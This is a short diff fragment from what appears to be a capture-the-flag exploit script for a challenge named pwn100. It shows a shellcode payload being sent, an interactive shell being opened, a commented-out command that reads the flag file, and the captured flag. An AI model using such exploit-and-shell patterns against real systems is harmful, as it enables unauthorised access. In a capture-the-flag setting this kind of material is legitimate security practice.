@@ -11,6 +11,6 @@ pay+=shell
 r.send(pay)
 r.interactive()
 
-#r.sendline("cat /home/pwn100/flag")
+#cat /home/pwn100/flag
 
 #Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}
